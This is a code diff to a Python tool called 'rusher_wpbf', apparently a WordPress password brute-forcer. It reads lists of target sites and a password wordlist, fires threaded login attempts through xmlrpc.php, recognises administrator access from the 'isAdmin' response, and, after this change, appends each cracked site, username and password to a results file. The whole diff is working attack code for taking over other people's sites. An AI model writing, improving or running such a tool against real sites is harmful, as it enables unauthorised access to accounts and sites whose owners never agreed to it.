@@ -66,7 +66,7 @@ class rusher_wpbf:
                 if "<name>isAdmin</name>" in x.text:
 
                     print("[+] [Success] [{}] -> ( {} | {} )".format(target, user, passwd))
-                    open("result-wp/site.txt", "w").write("{}/wp-login.php|{}|{}")
+                    open("result-wp/site.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
                     os._exit(1)
 
                 else:
@@ -97,33 +97,33 @@ class rusher_wpbf:
 
         if os.path.isfile(args.target):
 
-            for target in open(args.target, errors="ignore").read().split("\n"):
+            if os.path.isfile(args.wordlist):
 
-                if target != '':
+                for target in open(args.target, errors="ignore").read().split("\n"):
 
-                    if os.path.isfile(args.wordlist):
+                    if target != '':
 
-                        if self.check_xmlrpc(target):
+                            if self.check_xmlrpc(target):
 
-                            user = self.get_user(target)
+                                user = self.get_user(target)
 
-                            for x in open(args.wordlist, errors="ignore").read().split("\n"):
+                                for x in open(args.wordlist, errors="ignore").read().split("\n"):
 
-                                if x != '':
+                                    if x != '':
 
-                                    t = Thread(target=self.req, args=(target, user, x))
-                                    t.daemon = True
-                                    t.start()
-                                    delay(0.1)
+                                        t = Thread(target=self.req, args=(target, user, x))
+                                        t.daemon = True
+                                        t.start()
+                                        delay(0.1)
 
-                        else:
+                            else:
 
-                            print("[-] Not found xmlrpc.php")
-                            continue
+                                print("[-] [Error] [{}] -> ( Not found xmlrpc.php )".format(target))
+                                continue
 
-                    else:
+            else:
 
-                        print("[-] Not found ( {} )".format(args.wordlist))
+                print("[-] [Error] -> ( Not found {} )".format(args.wordlist))
 
         else:
 
@@ -144,12 +144,11 @@ class rusher_wpbf:
 
                 else:
 
-                    print("[-] Not found xmlrpc.php")
-                    os._exit(1)
+                    print("[-] [Error] [{}] -> ( Not found xmlrpc.php )".format(args.target))
 
             else:
 
-                print("[-] Not found ( {} )".format(args.wordlist))
+                print("[-] [Error] -> ( Not found {} )".format(args.wordlist))
 
 if __name__ == "__main__":
     
